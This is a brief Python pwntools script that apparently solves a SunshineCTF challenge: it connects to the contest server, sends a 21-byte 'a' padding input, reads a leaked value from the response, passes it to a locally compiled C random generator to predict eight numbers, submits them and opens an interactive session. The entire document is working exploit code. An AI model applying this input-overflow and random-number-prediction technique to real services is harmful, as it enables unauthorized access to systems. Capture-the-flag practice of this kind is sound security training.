from pwn import *
import ctypes
r = remote("sunshinectf.games", 22000)
#Create a C script namely clibrary.c and put your random generating function in there
#Run this cmd in terminal: gcc -fPIC -shared -o clibrary.so clibrary.c
clib = ctypes.CDLL("./clibrary.so")
r.recv()
r.sendline(b"a"*21)
#Just some crazy maneuvers so I can get the wanted line
res = r.recvline()
res = r.recvline()
res = r.recvline()
res = r.recvline()
print(res)
#Setting up for the int array return
clib.genRand.argtypes = ()
clib.genRand.restype = ctypes.POINTER(ctypes.c_int)

ret = clib.genRand(res[29:33])
#Looping through each number
for i in range(8):
    r.sendline(str(ret[i]))
    res = r.recvline()
    print(res)
r.interactive()

